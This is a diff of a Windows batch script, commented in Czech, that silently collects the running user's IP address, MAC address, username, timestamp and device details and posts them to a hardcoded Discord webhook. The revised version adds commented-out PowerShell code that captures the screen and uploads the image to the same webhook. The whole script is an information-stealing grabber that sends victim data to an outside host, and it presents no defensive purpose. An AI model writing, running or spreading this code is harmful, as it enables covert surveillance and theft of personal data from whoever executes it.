@@ -1,57 +1,35 @@
 @echo off
-chcp 65001 >nul
 setlocal EnableDelayedExpansion
-
-:: ──────────────── SYSTEMOVÉ INFO ────────────────
 
 :: 🌐 Webhook
 set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N_ZDkZQ1TRUiAgqiaqhPpkgcN6KIiFO1m5PWw6aDAm0cFOE445el1c8"
 
-:: 🌍 IP + uživatel
-for /f "delims=" %%x in ('curl -s https://api.ipify.org') do set "ip=%%x"
-set "user=%USERNAME%"
+:: 📡 Získání MAC adresy
+for /f "tokens=1 delims=," %%a in ('getmac /fo csv /nh') do set "MAC=%%~a" & goto macdone
+:macdone
 
-:: 🕒 Datum a čas
-for /f "tokens=1-4 delims=. " %%x in ("%date%") do (
-    set "d1=%%x"
-    set "d2=%%y"
-    set "d3=%%z"
-)
-for /f "tokens=1-2 delims=: " %%x in ("%time%") do (
-    set "t1=%%x"
-    set "t2=%%y"
-)
-set "timestamp=!d1!.!d2!.!d3! !t1!:!t2!"
+:: 📡 Získání IP adresy
+for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /c:"IPv4"') do set "IP=%%i"
 
-:: 💻 Typ zařízení
-set "deviceType=Stolní PC"
-for /f %%i in ('wmic path Win32_Battery get Name ^| findstr /i /v "Name"') do (
-    set "deviceType=Notebook"
-)
+:: 👤 Uživatel a zařízení
+set "USER=%USERNAME%"
+set "DEVICE=Notebook"
+set "MODEL=Neznámý model"
+set "RAM=GB"
 
-:: 🖥️ Model
-set "deviceModel=Neznámý model"
-for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
-    if not defined deviceModel (
-        set "deviceModel=%%i"
-    )
-)
+:: ⏰ Datum a čas
+for /f %%i in ('wmic OS get LocalDateTime ^| findstr /r "[0-9]"') do set "DATUM=%%i"
+set "DATUM=!DATUM:~6,2!.!DATUM:~4,2!.!DATUM:~0,4! !DATUM:~8,2!:!DATUM:~10,2!"
 
-:: 🧠 RAM
-for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get totalphysicalmemory') do set "ramRaw=%%i"
-set /a ram=%ramRaw:~0,-6%
+:: 📤 Odeslání na Discord webhook
+curl -X POST -H "Content-Type: application/json" ^
+-d "{\"content\":\"📡 IP: !IP!\nČas: !DATUM!\nUživatel: !USER!\nZařízení: !DEVICE!\nModel: !MODEL!\nRAM: !RAM!\nMAC: !MAC!\"}" ^
+%webhook%
 
-:: 🧾 Zpráva
-set "msg=🛰️ IP: ||!ip!||\nČas: !timestamp!\nUživatel: !user!\nZařízení: !deviceType!\nModel: !deviceModel!\nRAM: !ram! GB"
+:: 🖼️ (Volitelné) Screenshot – pokud chceš, lze přidat přes PowerShell nebo externí nástroj
+:: powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen(0,0,0,0,$bmp.Size); $bmp.Save('%TEMP%\screen.png');"
 
-:: ──────────────── ODESLÁNÍ NA WEBHOOK ────────────────
+:: 📤 (Volitelné) Odeslání screenshotu na webhook
+:: curl -X POST -F "file=@%TEMP%\screen.png" %webhook%
 
-set "payload=%TEMP%\payload.json"
-echo { > "!payload!"
-echo   "content": "!msg!" >> "!payload!"
-echo } >> "!payload!"
-curl -s -X POST %webhook% -H "Content-Type: application/json" --data "@!payload!" >nul
-del /f /q "!payload!"
-
-:: ✅ Hotovo
 exit
